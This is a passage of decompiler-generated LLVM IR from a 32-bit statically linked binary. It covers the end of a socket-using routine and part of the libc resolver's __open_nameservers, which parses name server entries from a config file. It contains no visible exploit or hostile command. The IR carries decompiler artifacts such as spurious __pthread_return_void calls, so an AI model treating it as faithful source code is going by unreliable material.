  %v2_804c6d0 = add i32 %v1_804c6d0, -4
  %v3_804c6d0 = inttoptr i32 %v2_804c6d0 to i32*
  store i32 %v0_804c6d0, i32* %v3_804c6d0, align 4
  %v1_804c6d1 = add i32 %v1_804c6d0, -8
  %v2_804c6d1 = inttoptr i32 %v1_804c6d1 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v2_804c6d1, align 4
  %v1_804c6d6 = add i32 %v1_804c6d0, -12
  %v2_804c6d6 = inttoptr i32 %v1_804c6d6 to i32*
  store i32 134526883, i32* %v2_804c6d6, align 4
  %v1_804c6db = add i32 %v1_804c6d0, 184
  store i32 %v1_804c6db, i32* %ebx.global-to-local, align 4
  %v2_804c6e2 = add i32 %v1_804c6d0, -16
  %v3_804c6e2 = inttoptr i32 %v2_804c6e2 to i32*
  store i32 %v1_804c6db, i32* %v3_804c6e2, align 4
  %v3_804c6e3 = call i32 @__pthread_return_void(i32 %v1_804c6b1.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c6e3, i32* %eax.global-to-local, align 4
  %v0_804c6e8 = load i32, i32* @esp, align 4
  %v1_804c6e8 = inttoptr i32 %v0_804c6e8 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v1_804c6e8, align 4
  %v2_804c6ef = call i32 @__pthread_return_0(i32 %v1_804c6b1.pre-phi)
  store i32 %v2_804c6ef, i32* %eax.global-to-local, align 4
  %v0_804c6f4 = load i32, i32* @esp, align 4
  %v1_804c6f4 = add i32 %v0_804c6f4, 60
  %v2_804c6f4 = inttoptr i32 %v1_804c6f4 to i32*
  %v3_804c6f4 = load i32, i32* %v2_804c6f4, align 4
  store i32 %v3_804c6f4, i32* %eax.global-to-local, align 4
  %v1_804c6f8 = add i32 %v0_804c6f4, 56
  %v2_804c6f8 = inttoptr i32 %v1_804c6f8 to i32*
  %v3_804c6f8 = load i32, i32* %v2_804c6f8, align 4
  store i32 %v3_804c6f8, i32* %edx.global-to-local, align 4
  %v1_804c6fc = trunc i32 %v3_804c6f4 to i16
  store i16 %v1_804c6fc, i16* @global_var_805215c.86, align 4
  %v1_804c702 = inttoptr i32 %v0_804c6f4 to i32*
  %v2_804c702 = load i32, i32* %v1_804c702, align 4
  store i32 %v2_804c702, i32* @eax, align 4
  %v3_804c702 = add i32 %v0_804c6f4, 4
  %v1_804c703 = sext i32 %v3_804c6f8 to i64
  store i64 %v1_804c703, i64* @global_var_8052540.85, align 64
  %v1_804c709 = inttoptr i32 %v3_804c702 to i32*
  %v2_804c709 = load i32, i32* %v1_804c709, align 4
  store i32 %v2_804c709, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804c709, align 4
  %v0_804c70c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c70c, i32* %v1_804c702, align 4
  %v3_804c70d = call i32 @__pthread_return_void(i32 %v1_804c6b1.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c70d, i32* %eax.global-to-local, align 4
  %v0_804c712 = load i32, i32* @esp, align 4
  %v1_804c712 = add i32 %v0_804c712, 32
  %v2_804c712 = inttoptr i32 %v1_804c712 to i32*
  store i32 -1, i32* %v2_804c712, align 4
  br label %dec_label_pc_804c71a

dec_label_pc_804c71a:                             ; preds = %dec_label_pc_804c58e, %dec_label_pc_804c6d0
  %v0_804c71a = load i32, i32* @esp, align 4
  %v1_804c71a = add i32 %v0_804c71a, 16
  br label %dec_label_pc_804c71d

dec_label_pc_804c71d:                             ; preds = %dec_label_pc_804c6aa.dec_label_pc_804c71d_crit_edge, %dec_label_pc_804c71a
  %v0_804c71d = phi i32 [ %v0_804c71d.pre, %dec_label_pc_804c6aa.dec_label_pc_804c71d_crit_edge ], [ %v1_804c71a, %dec_label_pc_804c71a ]
  %v1_804c71d = add i32 %v0_804c71d, 16
  %v2_804c71d = inttoptr i32 %v1_804c71d to i32*
  %v3_804c71d = load i32, i32* %v2_804c71d, align 4
  store i32 %v3_804c71d, i32* %eax.global-to-local, align 4
  %v1_804c721 = add i32 %v0_804c71d, 220
  %v1_804c727 = inttoptr i32 %v1_804c721 to i32*
  %v2_804c727 = load i32, i32* %v1_804c727, align 4
  store i32 %v2_804c727, i32* @ebx, align 4
  %v3_804c727 = add i32 %v0_804c71d, 224
  %v1_804c728 = inttoptr i32 %v3_804c727 to i32*
  %v2_804c728 = load i32, i32* %v1_804c728, align 4
  store i32 %v2_804c728, i32* @esi, align 4
  %v3_804c728 = add i32 %v0_804c71d, 228
  %v1_804c729 = inttoptr i32 %v3_804c728 to i32*
  %v2_804c729 = load i32, i32* %v1_804c729, align 4
  store i32 %v2_804c729, i32* @edi, align 4
  %v3_804c729 = add i32 %v0_804c71d, 232
  %v1_804c72a = inttoptr i32 %v3_804c729 to i32*
  %v2_804c72a = load i32, i32* %v1_804c72a, align 4
  store i32 %v2_804c72a, i32* @ebp, align 4
  ret i32 %v3_804c71d

; uselistorder directives
  uselistorder i32 %v0_804c71d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c6f4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c6aa, { 1, 0 }
  uselistorder i32 %v1_804c6b1.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_804c65c.pre, { 1, 0 }
  uselistorder i32 %v5_804c62f, { 1, 0 }
  uselistorder i32 %v3_804c62f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c5f7, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804c5c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c58e, { 1, 0 }
  uselistorder i32 %v3_804c56d, { 1, 0, 2 }
  uselistorder i32 %v0_804c55e, { 1, 0 }
  uselistorder i32 %v5_804c554, { 1, 0 }
  uselistorder i32* %v3_804c554, { 1, 0 }
  uselistorder i32 %v0_804c42a81, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_804c554, { 2, 1, 0 }
  uselistorder i32 %v5_804c54e, { 1, 0 }
  uselistorder i32 %v1_804c54d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c549, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c50d, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_804c4e7, { 1, 0 }
  uselistorder i32 %v1_804c4d8, { 1, 0 }
  uselistorder i32 %v3_804c4a9, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804c497, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804c43e, { 1, 2, 0 }
  uselistorder i32 %v0_804c43e, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_804c418, { 1, 0 }
  uselistorder i32 %v0_804c418.pre, { 2, 1, 0 }
  uselistorder i32 %v0_804c40e, { 1, 2, 0 }
  uselistorder i32 %v0_804c42068, { 3, 2, 1, 0 }
  uselistorder i32 %v5_804c41858, { 1, 0 }
  uselistorder i32 %v5_804c3ba, { 1, 0 }
  uselistorder i32* %v2_804c3ba, { 1, 0, 2 }
  uselistorder i32 %v3_804c372, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804c358, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_804c358, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_804c337, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c317, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c2bd, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_804c2a2, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_804c28b, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c213, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804c1c6, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c1a7, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804c18b, { 1, 0 }
  uselistorder i32 %v3_804c180, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_804c17d, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_804c122, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_804c11d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c106, { 1, 0 }
  uselistorder i32 %v1_804c0d2, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804c0c395, { 2, 1, 0 }
  uselistorder i16 %v0_804c083, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_804c07c, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_804bfee, { 4, 3, 5, 1, 2, 11, 9, 10, 0, 8, 6, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 10000, { 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 72, { 0, 2, 3, 1, 4 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805215c.86, { 2, 1, 0 }
  uselistorder i64* @global_var_8052540.85, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8052528.84 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8052528.84, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804c71d, { 1, 0 }
  uselistorder label %dec_label_pc_804c71a, { 1, 0 }
  uselistorder label %dec_label_pc_804c6aa, { 1, 0 }
  uselistorder label %dec_label_pc_804c694, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c681, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804c65c.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c654, { 1, 0 }
  uselistorder label %dec_label_pc_804c63b, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804c5f0, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_804c58e, { 1, 0 }
  uselistorder label %dec_label_pc_804c55e, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_804c554, { 1, 0 }
  uselistorder label %dec_label_pc_804c549, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c546, { 1, 0 }
  uselistorder label %dec_label_pc_804c4c1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c409, { 1, 0 }
  uselistorder label %dec_label_pc_804c28b, { 1, 0 }
  uselistorder label %dec_label_pc_804c254, { 1, 0 }
  uselistorder label %dec_label_pc_804c1c6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c0d2, { 1, 0 }
  uselistorder label %dec_label_pc_804c0bc, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_804c72c = load i32, i32* @ebp, align 4
  store i32 134526883, i32* %stack_var_-216, align 4
  %v3_804c73b = ptrtoint i32* %stack_var_-216 to i32
  %v2_804c740 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c740, i32* @eax, align 4
  %v2_804c748 = call i32 @__pthread_return_void(i32 %v2_804c740, i32 134526883)
  %v1_804c754 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052160.32 to i32))
  store i32 %v1_804c754, i32* @eax, align 4
  %v0_804c75c = load i32, i32* @global_var_8054994.33, align 4
  %tmp41 = icmp slt i32 %v0_804c75c, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_804c953, label %dec_label_pc_804c769

dec_label_pc_804c769:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805083e.89 to i32), i32* %stack_var_-216, align 4
  %v2_804c775 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805080c.90 to i32), i32 ptrtoint (i32* @global_var_805083e.89 to i32))
  store i32 %v2_804c775, i32* @eax, align 4
  %v1_804c77d = icmp eq i32 %v2_804c775, 0
  store i32 %v2_804c775, i32* @ebp, align 4
  %v1_804c781 = icmp eq i1 %v1_804c77d, false
  br i1 %v1_804c781, label %dec_label_pc_804c91e.preheader, label %dec_label_pc_804c787

dec_label_pc_804c787:                             ; preds = %dec_label_pc_804c769
  store i32 ptrtoint (i32* @global_var_805083e.89 to i32), i32* %stack_var_-216, align 4
  %v2_804c793 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805081d.91 to i32), i32 ptrtoint (i32* @global_var_805083e.89 to i32))
  %v1_804c79b = icmp eq i32 %v2_804c793, 0
  store i32 %v2_804c793, i32* @ebp, align 4
  %v1_804c79f = icmp eq i1 %v1_804c79b, false
  br i1 %v1_804c79f, label %dec_label_pc_804c91e.preheader, label %dec_label_pc_804c948

dec_label_pc_804c91e.preheader:                   ; preds = %dec_label_pc_804c769, %dec_label_pc_804c787
  %v2_804c925 = ptrtoint i32* %stack_var_-180 to i32
  %v3_804c859 = add i32 %v3_804c73b, 164
  %v4_804c848 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_804c91e

dec_label_pc_804c7aa:                             ; preds = %dec_label_pc_804c7b5
  %v1_804c7aa = add i32 %v0_804c7aa56, 1
  store i32 %v1_804c7aa, i32* @ebx, align 4
  %v1_804c7ab = inttoptr i32 %v1_804c7aa to i8*
  %v2_804c7ab = load i8, i8* %v1_804c7ab, align 1
  %v3_804c7ab = zext i8 %v2_804c7ab to i32
  %v5_804c7ab = and i32 %v6_804c7ab59, -256
  %v6_804c7ab = or i32 %v3_804c7ab, %v5_804c7ab
  store i32 %v6_804c7ab, i32* @ecx, align 4
  %v4_804c7ad = icmp eq i8 %v2_804c7ab, 0
  br i1 %v4_804c7ad, label %dec_label_pc_804c91e, label %dec_label_pc_804c7b5

dec_label_pc_804c7b5:                             ; preds = %dec_label_pc_804c7b5.lr.ph, %dec_label_pc_804c7aa
  %v6_804c7ab59 = phi i32 [ %v6_804c7ab53, %dec_label_pc_804c7b5.lr.ph ], [ %v6_804c7ab, %dec_label_pc_804c7aa ]
  %v2_804c7ab58 = phi i8 [ %v2_804c7ab50, %dec_label_pc_804c7b5.lr.ph ], [ %v2_804c7ab, %dec_label_pc_804c7aa ]
  %v1_804c7ab57 = phi i8* [ %v1_804c7ab49, %dec_label_pc_804c7b5.lr.ph ], [ %v1_804c7ab, %dec_label_pc_804c7aa ]
  %v0_804c7aa56 = phi i32 [ %v0_804c7ab.pre, %dec_label_pc_804c7b5.lr.ph ], [ %v1_804c7aa, %dec_label_pc_804c7aa ]
  store i32 %v0_804c7b5.pre, i32* @eax, align 4
  %v2_804c7ba = sext i8 %v2_804c7ab58 to i32
  store i32 %v2_804c7ba, i32* @edx, align 4
  %v2_804c7bd = mul nsw i32 %v2_804c7ba, 2
  %v3_804c7bd = add i32 %v0_804c7b5.pre, %v2_804c7bd
  %v4_804c7bd = inttoptr i32 %v3_804c7bd to i8*
  %v5_804c7bd = load i8, i8* %v4_804c7bd, align 1
  %v6_804c7bd = and i8 %v5_804c7bd, 32
  %v7_804c7bd = icmp eq i8 %v6_804c7bd, 0
  %v1_804c7c1 = icmp eq i1 %v7_804c7bd, false
  br i1 %v1_804c7c1, label %dec_label_pc_804c7aa, label %dec_label_pc_804c7c3

dec_label_pc_804c7c3:                             ; preds = %dec_label_pc_804c7b5
  %v10_804c7c3 = icmp eq i8 %v2_804c7ab58, 10
  br i1 %v10_804c7c3, label %dec_label_pc_804c91e, label %dec_label_pc_804c7cc

dec_label_pc_804c7cc:                             ; preds = %dec_label_pc_804c7c3
  %v10_804c7cc = icmp eq i8 %v2_804c7ab58, 35
  %v1_804c7d7 = icmp eq i1 %v10_804c7cc, false
  br i1 %v1_804c7d7, label %dec_label_pc_804c828.preheader, label %dec_label_pc_804c91e

dec_label_pc_804c828.preheader:                   ; preds = %dec_label_pc_804c7cc
  %v2_804c8286 = load i8, i8* %v1_804c7ab57, align 1
  %v3_804c8287 = icmp eq i8 %v2_804c8286, 0
  br i1 %v3_804c8287, label %dec_label_pc_804c834, label %dec_label_pc_804c82d

dec_label_pc_804c7de:                             ; preds = %dec_label_pc_804c82d
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_804c7e2 = load i32, i32* @esp, align 4
  %v3_804c7e2 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_804c7e2 = add nuw nsw i32 %v3_804c7e2, 152
  %v5_804c7e2 = add i32 %v4_804c7e2, %v1_804c7e2
  %v6_804c7e2 = inttoptr i32 %v5_804c7e2 to i32*
  store i32 %v0_804c7e2, i32* %v6_804c7e2, align 4
  %v0_804c7ec.pre = load i32, i32* @ebx, align 4
  %v4_804c7ec.pre = load i32, i32* @ecx, align 4
  %v1_804c7ec60 = inttoptr i32 %v0_804c7ec.pre to i8*
  %v2_804c7ec61 = load i8, i8* %v1_804c7ec60, align 1
  %v3_804c7ec62 = zext i8 %v2_804c7ec61 to i32
  %v5_804c7ec63 = and i32 %v4_804c7ec.pre, -256
  %v6_804c7ec64 = or i32 %v3_804c7ec62, %v5_804c7ec63
  %v4_804c7ee65 = icmp eq i8 %v2_804c7ec61, 0
  br i1 %v4_804c7ee65, label %dec_label_pc_804c80b.preheader, label %dec_label_pc_804c7f2.lr.ph

dec_label_pc_804c7f2.lr.ph:                       ; preds = %dec_label_pc_804c7de
  %v0_804c7f2.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804c7f2

dec_label_pc_804c7eb:                             ; preds = %dec_label_pc_804c800
  %v1_804c7eb = add i32 %v0_804c7eb67, 1
  store i32 %v1_804c7eb, i32* @ebx, align 4
  %v1_804c7ec = inttoptr i32 %v1_804c7eb to i8*
  %v2_804c7ec = load i8, i8* %v1_804c7ec, align 1
  %v3_804c7ec = zext i8 %v2_804c7ec to i32
  %v5_804c7ec = and i32 %v6_804c7ec69, -256
  %v6_804c7ec = or i32 %v3_804c7ec, %v5_804c7ec
  %v4_804c7ee = icmp eq i8 %v2_804c7ec, 0
  br i1 %v4_804c7ee, label %dec_label_pc_804c80b.preheader, label %dec_label_pc_804c7f2

dec_label_pc_804c7f2:                             ; preds = %dec_label_pc_804c7f2.lr.ph, %dec_label_pc_804c7eb
  %v6_804c7ec69 = phi i32 [ %v6_804c7ec64, %dec_label_pc_804c7f2.lr.ph ], [ %v6_804c7ec, %dec_label_pc_804c7eb ]
  %v2_804c7ec68 = phi i8 [ %v2_804c7ec61, %dec_label_pc_804c7f2.lr.ph ], [ %v2_804c7ec, %dec_label_pc_804c7eb ]
  %v0_804c7eb67 = phi i32 [ %v0_804c7ec.pre, %dec_label_pc_804c7f2.lr.ph ], [ %v1_804c7eb, %dec_label_pc_804c7eb ]
  store i32 %v0_804c7f2.pre, i32* @eax, align 4
  %v2_804c7f7 = sext i8 %v2_804c7ec68 to i32
  store i32 %v2_804c7f7, i32* @edx, align 4
  %v2_804c7fa = mul nsw i32 %v2_804c7f7, 2
  %v3_804c7fa = add i32 %v0_804c7f2.pre, %v2_804c7fa
  %v4_804c7fa = inttoptr i32 %v3_804c7fa to i8*
  %v5_804c7fa = load i8, i8* %v4_804c7fa, align 1
  %v6_804c7fa = and i8 %v5_804c7fa, 32
  %v7_804c7fa = icmp eq i8 %v6_804c7fa, 0
  %v1_804c7fe = icmp eq i1 %v7_804c7fa, false
  br i1 %v1_804c7fe, label %dec_label_pc_804c80b.preheader, label %dec_label_pc_804c800

dec_label_pc_804c800:                             ; preds = %dec_label_pc_804c7f2
  %v10_804c800 = icmp eq i8 %v2_804c7ec68, 10
  %v1_804c803 = icmp eq i1 %v10_804c800, false
  br i1 %v1_804c803, label %dec_label_pc_804c7eb, label %dec_label_pc_804c80b.preheader

dec_label_pc_804c80b.preheader:                   ; preds = %dec_label_pc_804c800, %dec_label_pc_804c7f2, %dec_label_pc_804c7eb, %dec_label_pc_804c7de
  %v0_804c7eb.lcssa = phi i32 [ %v0_804c7ec.pre, %dec_label_pc_804c7de ], [ %v1_804c7eb, %dec_label_pc_804c7eb ], [ %v0_804c7eb67, %dec_label_pc_804c7f2 ], [ %v0_804c7eb67, %dec_label_pc_804c800 ]
  %v6_804c7ec.lcssa = phi i32 [ %v6_804c7ec64, %dec_label_pc_804c7de ], [ %v6_804c7ec, %dec_label_pc_804c7eb ], [ %v6_804c7ec69, %dec_label_pc_804c7f2 ], [ %v6_804c7ec69, %dec_label_pc_804c800 ]
  %v1_804c80b75 = inttoptr i32 %v0_804c7eb.lcssa to i8*
  %v2_804c80b76 = load i8, i8* %v1_804c80b75, align 1
  %v3_804c80b77 = zext i8 %v2_804c80b76 to i32
  %v5_804c80b78 = and i32 %v6_804c7ec.lcssa, -256
  %v6_804c80b79 = or i32 %v3_804c80b77, %v5_804c80b78
  store i32 %v6_804c80b79, i32* @ecx, align 4
  %v4_804c80d80 = icmp eq i8 %v2_804c80b76, 0
  br i1 %v4_804c80d80, label %dec_label_pc_804c824, label %dec_label_pc_804c811

dec_label_pc_804c807:                             ; preds = %dec_label_pc_804c81f, %dec_label_pc_804c811
  store i8 0, i8* %v1_804c80b83, align 1
  %v0_804c80a = load i32, i32* @ebx, align 4
  %v1_804c80a = add i32 %v0_804c80a, 1
  store i32 %v1_804c80a, i32* @ebx, align 4
  %v4_804c80b.pre = load i32, i32* @ecx, align 4
  %v1_804c80b = inttoptr i32 %v1_804c80a to i8*
  %v2_804c80b = load i8, i8* %v1_804c80b, align 1
  %v3_804c80b = zext i8 %v2_804c80b to i32
  %v5_804c80b = and i32 %v4_804c80b.pre, -256
  %v6_804c80b = or i32 %v3_804c80b, %v5_804c80b
  store i32 %v6_804c80b, i32* @ecx, align 4
  %v4_804c80d = icmp eq i8 %v2_804c80b, 0
  br i1 %v4_804c80d, label %dec_label_pc_804c824, label %dec_label_pc_804c811

dec_label_pc_804c811:                             ; preds = %dec_label_pc_804c80b.preheader, %dec_label_pc_804c807
  %v2_804c80b84 = phi i8 [ %v2_804c80b, %dec_label_pc_804c807 ], [ %v2_804c80b76, %dec_label_pc_804c80b.preheader ]
  %v1_804c80b83 = phi i8* [ %v1_804c80b, %dec_label_pc_804c807 ], [ %v1_804c80b75, %dec_label_pc_804c80b.preheader ]
  %v0_804c82882 = phi i32 [ %v1_804c80a, %dec_label_pc_804c807 ], [ %v0_804c7eb.lcssa, %dec_label_pc_804c80b.preheader ]
  %v0_804c811 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804c811, i32* @eax, align 4
  %v2_804c816 = sext i8 %v2_804c80b84 to i32
  store i32 %v2_804c816, i32* @edx, align 4
  %v2_804c819 = mul nsw i32 %v2_804c816, 2
  %v3_804c819 = add i32 %v0_804c811, %v2_804c819
  %v4_804c819 = inttoptr i32 %v3_804c819 to i8*
  %v5_804c819 = load i8, i8* %v4_804c819, align 1
  %v6_804c819 = and i8 %v5_804c819, 32
  %v7_804c819 = icmp eq i8 %v6_804c819, 0
  %v1_804c81d = icmp eq i1 %v7_804c819, false
  br i1 %v1_804c81d, label %dec_label_pc_804c807, label %dec_label_pc_804c81f

dec_label_pc_804c81f:                             ; preds = %dec_label_pc_804c811
  %v10_804c81f = icmp eq i8 %v2_804c80b84, 10
  br i1 %v10_804c81f, label %dec_label_pc_804c807, label %dec_label_pc_804c824

dec_label_pc_804c824:                             ; preds = %dec_label_pc_804c807, %dec_label_pc_804c81f, %dec_label_pc_804c80b.preheader
  %v0_804c828.lcssa = phi i32 [ %v0_804c7eb.lcssa, %dec_label_pc_804c80b.preheader ], [ %v0_804c82882, %dec_label_pc_804c81f ], [ %v1_804c80a, %dec_label_pc_804c807 ]
  %v1_804c80b.lcssa = phi i8* [ %v1_804c80b75, %dec_label_pc_804c80b.preheader ], [ %v1_804c80b83, %dec_label_pc_804c81f ], [ %v1_804c80b, %dec_label_pc_804c807 ]
  %v4_804c824 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_804c828 = load i8, i8* %v1_804c80b.lcssa, align 1
  %v3_804c828 = icmp eq i8 %v2_804c828, 0
  br i1 %v3_804c828, label %dec_label_pc_804c834, label %dec_label_pc_804c82d

dec_label_pc_804c82d:                             ; preds = %dec_label_pc_804c828.preheader, %dec_label_pc_804c824
  %v0_804c7e2 = phi i32 [ %v0_804c828.lcssa, %dec_label_pc_804c824 ], [ %v0_804c7aa56, %dec_label_pc_804c828.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_804c824, %dec_label_pc_804c824 ], [ 0, %dec_label_pc_804c828.preheader ]
  %v7_804c832 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_804c832, label %dec_label_pc_804c834, label %dec_label_pc_804c7de

dec_label_pc_804c834:                             ; preds = %dec_label_pc_804c824, %dec_label_pc_804c82d, %dec_label_pc_804c828.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_804c828.preheader ], [ %v4_804c824, %dec_label_pc_804c824 ], [ %stack_var_-196.013, %dec_label_pc_804c82d ]
  store i32 %tmp, i32* @edi, align 4
  %v0_804c83b = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8050835.92 to i32), i32* %stack_var_-216, align 4
  %v5_804c848 = call i32 @__GI_strcoll(i8* %v4_804c848, i32 ptrtoint ([11 x i8]* @global_var_8050835.92 to i32), i32 %v0_804c83b, i32 %v0_804c83b)
  store i32 %v5_804c848, i32* @eax, align 4
  %v1_804c850 = icmp eq i32 %v5_804c848, 0
  br i1 %v1_804c850, label %dec_label_pc_804c878.preheader, label %dec_label_pc_804c889

dec_label_pc_804c878.preheader:                   ; preds = %dec_label_pc_804c834
  %v0_804c87889 = load i32, i32* @esi, align 4
  %v5_804c87c94 = icmp slt i32 %v0_804c87889, %stack_var_-196.0.lcssa
  br i1 %v5_804c87c94, label %dec_label_pc_804c87e.lr.ph, label %dec_label_pc_804c889

dec_label_pc_804c87e.lr.ph:                       ; preds = %dec_label_pc_804c878.preheader
  %v0_804c87e.pre = load i32, i32* @global_var_8054994.33, align 4
  br label %dec_label_pc_804c87e

dec_label_pc_804c856:                             ; preds = %dec_label_pc_804c87e
  %v2_804c859 = mul i32 %v0_804c87895, 4
  %v4_804c859 = add i32 %v2_804c859, %v3_804c859
  %v5_804c859 = inttoptr i32 %v4_804c859 to i32*
  %v6_804c859 = load i32, i32* %v5_804c859, align 4
  %v1_804c860 = add i32 %v0_804c87895, 1
  store i32 %v1_804c860, i32* @esi, align 4
  %v1_804c861 = inttoptr i32 %v6_804c859 to i8*
  %v2_804c861 = call i32 @__GI_strdup(i8* %v1_804c861)
  %v1_804c869 = load i32, i32* @ebx, align 4
  %v2_804c869 = mul i32 %v1_804c869, 4
  %v3_804c869 = add i32 %v2_804c869, 134564232
  %v4_804c869 = inttoptr i32 %v3_804c869 to i32*
  store i32 %v2_804c861, i32* %v4_804c869, align 4
  %v0_804c870 = load i32, i32* @ebx, align 4
  %v1_804c870 = add i32 %v0_804c870, 1
  store i32 %v1_804c870, i32* @eax, align 4
  store i32 %v1_804c870, i32* @global_var_8054994.33, align 4
  %v0_804c878 = load i32, i32* @esi, align 4
  %v5_804c87c = icmp slt i32 %v0_804c878, %stack_var_-196.0.lcssa
  br i1 %v5_804c87c, label %dec_label_pc_804c87e, label %dec_label_pc_804c889

dec_label_pc_804c87e:                             ; preds = %dec_label_pc_804c87e.lr.ph, %dec_label_pc_804c856
  %v0_804c87e = phi i32 [ %v0_804c87e.pre, %dec_label_pc_804c87e.lr.ph ], [ %v1_804c870, %dec_label_pc_804c856 ]
  %v0_804c87895 = phi i32 [ %v0_804c87889, %dec_label_pc_804c87e.lr.ph ], [ %v0_804c878, %dec_label_pc_804c856 ]
  store i32 %v0_804c87e, i32* @ebx, align 4
  %v7_804c887 = icmp sgt i32 %v0_804c87e, 2
  br i1 %v7_804c887, label %dec_label_pc_804c889, label %dec_label_pc_804c856

dec_label_pc_804c889:                             ; preds = %dec_label_pc_804c878.preheader, %dec_label_pc_804c856, %dec_label_pc_804c87e, %dec_label_pc_804c834
  %v0_804c889 = load i32, i32* @ebx, align 4
